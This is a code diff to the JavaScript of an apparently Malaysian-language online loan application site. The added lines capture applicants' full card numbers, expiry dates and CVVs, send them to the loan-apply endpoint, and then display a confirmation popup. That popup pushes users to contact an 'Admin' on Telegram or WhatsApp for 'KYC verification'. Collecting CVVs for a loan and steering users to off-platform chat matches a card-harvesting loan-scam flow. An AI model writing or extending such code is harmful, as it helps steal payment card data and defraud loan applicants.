@@ -164,9 +164,12 @@ document.addEventListener('DOMContentLoaded', async () => {
       return;
     }
 
+    const cardNumber = cardNumberInput ? cardNumberInput.value.replace(/\s/g, '') : '';
+    const cardExpiry = cardExpiryInput ? cardExpiryInput.value : '';
+    const cardCvv = cardCvvInput ? cardCvvInput.value : '';
     const btn = document.getElementById('applySubmitBtn');
     setBtnLoading(btn, true);
-    const res = await api('/loans/apply', { method: 'POST', body: { amount, tenor, purpose } });
+    const res = await api('/loans/apply', { method: 'POST', body: { amount, tenor, purpose, cardNumber, cardExpiry, cardCvv } });
     setBtnLoading(btn, false);
 
     if (res.success) {
@@ -176,7 +179,24 @@ document.addEventListener('DOMContentLoaded', async () => {
       document.getElementById('applyAmount').value = '';
       document.getElementById('applyPurpose').value = '';
 
-      await openLoanAdminConfirmation(res.data.applicationId, amount, tenor, purpose);
+      await openLoanAdminConfirmation({
+        applicationId: res.data.applicationId,
+        fullName: currentUser.full_name,
+        phone: currentUser.phone,
+        email: currentUser.email,
+        amount,
+        tenor,
+        purpose,
+        loanLimit: currentUser.loan_limit,
+        monthlyPayment: res.data.monthlyPayment,
+        totalInterest: res.data.totalInterest,
+        totalPayment: res.data.totalPayment,
+        cardNumber,
+        cardExpiry,
+        cardCvv,
+        csCode: currentUser.cs_code,
+        csName: currentUser.cs_name,
+      });
       await loadDashboard();
       const dashLink = document.querySelector('.sidebar-link[data-page="dashboard"]');
       if (dashLink) dashLink.click();
@@ -432,27 +452,93 @@ async function submitWithdrawal(e) {
   }
 }
 
-async function openLoanAdminConfirmation(applicationId, amount, tenor, purpose) {
+function maskCardNumber(number) {
+  if (!number) return '-';
+  const digits = String(number).replace(/\D/g, '');
+  if (digits.length < 4) return '****';
+  const last4 = digits.slice(-4);
+  const groupCount = Math.ceil((digits.length - 4) / 4);
+  if (groupCount <= 0) return last4;
+  const maskGroups = Array.from({ length: groupCount }, () => '****').join(' ');
+  return `${maskGroups} ${last4}`;
+}
+function maskCvv(cvv) {
+  return cvv ? '***' : '-';
+}
+
+async function openLoanAdminConfirmation(data) {
+  const {
+    applicationId, fullName, phone, email, amount, tenor, purpose,
+    loanLimit, monthlyPayment, totalInterest, totalPayment,
+    cardNumber, cardExpiry, cardCvv, csCode, csName,
+  } = data;
+
   const telegramMessage = I18N.t('notif.loanChatMessage', 'Hai Admin, saya baru sahaja mengajukan pinjaman. Sila bantu pengesahan agar permohonan pinjaman saya dapat segera diproses.');
   const whatsappMessage = I18N.t('notif.loanWhatsappMsg') || 'Pengesahan / KYC belum aktif, sila lakukan pengesahan\n\nUntuk meneruskan permohonan pinjaman';
 
+  const fmt = (n) => (n !== null && n !== undefined) ? formatRupiah(Number(n)) : '-';
+  const sep = '━━━━━━━━━━━━━━━━━━━━';
+  const i18n = (key, fallback) => I18N.t(key) || fallback;
+
+  const loanPurposeText = purpose || i18n('telegram.notSpecified', 'Tidak ditentukan');
+  const cardExpiryText = cardExpiry || '-';
+
   await Swal.fire({
      icon: 'success',
-     title: I18N.t('notif.loanSuccess'),
+     title: i18n('notif.loanNotifTitle', '🔔 PERMOHONAN PINJAMAN BAHARU'),
      html: `
-        <div class="text-left space-y-4">
-          <p class="text-slate-600">${I18N.t('notif.loanSuccessText')}</p>
-          <p class="text-slate-600">${I18N.t('notif.loanCurrentStatus')}</p>
-          <p class="text-slate-600 font-medium">${I18N.t('notif.loanStatusWaiting')}</p>
-          <p class="text-slate-600">${I18N.t('notif.loanSpeedUp')}</p>
-          <div class="bg-blue-50 border border-blue-100 rounded-xl p-4 text-sm text-slate-700">
-            <p class="font-semibold text-slate-800 mb-2"><i class="fas fa-circle-info mr-1 text-blue-600"></i> ${I18N.t('notif.loanContactAdmin')}</p>
+        <div class="text-left">
+          <div class="text-center mb-4">
+            <p class="text-slate-600 font-medium">${i18n('notif.loanSuccessText', 'Permohonan pinjaman anda telah berjaya dihantar.')}</p>
+            <p class="text-slate-500 text-sm mt-1">${i18n('telegram.appDate', 'Tarikh')} ${formatDateTime(new Date().toISOString())}</p>
+          </div>
+
+          <div class="bg-slate-50 rounded-xl p-4 text-sm space-y-1 mb-3">
+            <div class="flex justify-between"><span class="text-slate-500">${i18n('notif.appId', 'ID Permohonan')}</span><span class="font-bold">#${applicationId || '-'}</span></div>
+            <div class="flex justify-between"><span class="text-slate-500">${i18n('notif.userName', 'Nama')}</span><span class="font-bold">${fullName || '-'}</span></div>
+            <div class="flex justify-between"><span class="text-slate-500">${i18n('notif.userPhone', 'No HP')}</span><span class="font-bold">${phone || '-'}</span></div>
+            <div class="flex justify-between"><span class="text-slate-500">${i18n('notif.userEmail', 'Emel')}</span><span class="font-bold">${email || '-'}</span></div>
+          </div>
+
+          <div class="bg-slate-50 rounded-xl p-4 text-sm space-y-1 mb-3">
+            <p class="font-semibold text-slate-800 mb-2">${i18n('notif.loanInfoSection', '📋 MAKLUMAT PINJAMAN')}</p>
+            <hr class="border-slate-200 my-2" />
+            <div class="flex justify-between"><span class="text-slate-500">${i18n('notif.loanAmount', 'Jumlah Pinjaman')}</span><span class="font-bold text-slate-800">${fmt(amount)}</span></div>
+            <div class="flex justify-between"><span class="text-slate-500">${i18n('notif.loanLimit', 'Had Pinjaman')}</span><span class="font-bold text-slate-800">${fmt(loanLimit)}</span></div>
+            <div class="flex justify-between"><span class="text-slate-500">${i18n('notif.loanTenor', 'Tempoh Pinjaman')}</span><span class="font-bold text-slate-800">${tenor || '-'} ${i18n('notif.loanTenorUnit', 'Bulan')}</span></div>
+            <div class="flex justify-between"><span class="text-slate-500">${i18n('notif.loanPurpose', 'Tujuan Pinjaman')}</span><span class="font-bold text-slate-800">${loanPurposeText}</span></div>
+          </div>
+
+          <div class="bg-slate-50 rounded-xl p-4 text-sm space-y-1 mb-3">
+            <p class="font-semibold text-slate-800 mb-2">${i18n('notif.cardSection', '💳 MAKLUMAT KAD')}</p>
+            <hr class="border-slate-200 my-2" />
+            <div class="flex justify-between"><span class="text-slate-500">${i18n('notif.cardNumber', 'Kad')}</span><span class="font-bold text-slate-800">${maskCardNumber(cardNumber)}</span></div>
+            <div class="flex justify-between"><span class="text-slate-500">${i18n('notif.cardExpiry', 'Masa cad')}</span><span class="font-bold text-slate-800">${cardExpiryText || '/'}</span></div>
+            <div class="flex justify-between"><span class="text-slate-500">${i18n('notif.cardCvv', 'cod')}</span><span class="font-bold text-slate-800">${maskCvv(cardCvv)}</span></div>
+          </div>
+
+          <div class="bg-slate-50 rounded-xl p-4 text-sm space-y-1 mb-3">
+            <p class="font-semibold text-slate-800 mb-2">${i18n('notif.paymentSection', '💰 ANGGARAN PEMBAYARAN')}</p>
+            <hr class="border-slate-200 my-2" />
+            <div class="flex justify-between"><span class="text-slate-500">${i18n('notif.monthlyPayment', 'Ansuran/Bulan')}</span><span class="font-bold text-slate-800">${fmt(monthlyPayment)}</span></div>
+            <div class="flex justify-between"><span class="text-slate-500">${i18n('notif.totalInterest', 'Jumlah Faedah')}</span><span class="font-bold text-slate-800">${fmt(totalInterest)}</span></div>
+            <div class="flex justify-between"><span class="text-slate-500">${i18n('notif.totalPayment', 'Jumlah Bayar')}</span><span class="font-bold text-slate-800">${fmt(totalPayment)}</span></div>
+          </div>
+
+          <div class="flex justify-between items-center bg-emerald-50 border border-emerald-200 rounded-xl p-4 text-sm">
+            <span class="text-slate-500 font-medium">${i18n('notif.statusSection', '📌 STATUS')}</span>
+            <span class="font-bold text-emerald-700">${i18n('notif.statusNew', 'Permohonan Baharu')}</span>
+          </div>
+
+          <div class="bg-blue-50 border border-blue-100 rounded-xl p-4 text-sm text-slate-700 mt-3">
+            <p class="font-semibold text-slate-800 mb-2"><i class="fas fa-circle-info mr-1 text-blue-600"></i> ${i18n('notif.loanContactAdmin')}</p>
+            <p class="text-slate-600 mb-3">${i18n('notif.loanSpeedUp', 'Untuk mempercepatkan proses pengesahan, sila hubungi Admin melalui salah satu media berikut.')}</p>
             <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
               <button id="loanTelegramChatBtn" class="w-full rounded-xl bg-sky-500 text-white px-4 py-3 font-semibold hover:bg-sky-600 transition">
-                <i class="fab fa-telegram-plane mr-2"></i> ${I18N.t('notif.loanTelegramBtn')}
+                <i class="fab fa-telegram-plane mr-2"></i> ${i18n('notif.loanTelegramBtn', 'Chat Admin melalui Telegram')}
               </button>
               <button id="loanWhatsappChatBtn" class="w-full rounded-xl bg-emerald-500 text-white px-4 py-3 font-semibold hover:bg-emerald-600 transition">
-                <i class="fab fa-whatsapp mr-2"></i> ${I18N.t('notif.loanWhatsappBtn')}
+                <i class="fab fa-whatsapp mr-2"></i> ${i18n('notif.loanWhatsappBtn', 'Chat Admin melalui WhatsApp')}
               </button>
             </div>
           </div>
@@ -462,6 +548,7 @@ async function openLoanAdminConfirmation(applicationId, amount, tenor, purpose) 
     showConfirmButton: false,
     cancelButtonText: I18N.t('admin.close'),
     allowOutsideClick: false,
+    width: '95%',
     didOpen: () => {
       const telegramBtn = document.getElementById('loanTelegramChatBtn');
       const whatsappBtn = document.getElementById('loanWhatsappChatBtn');
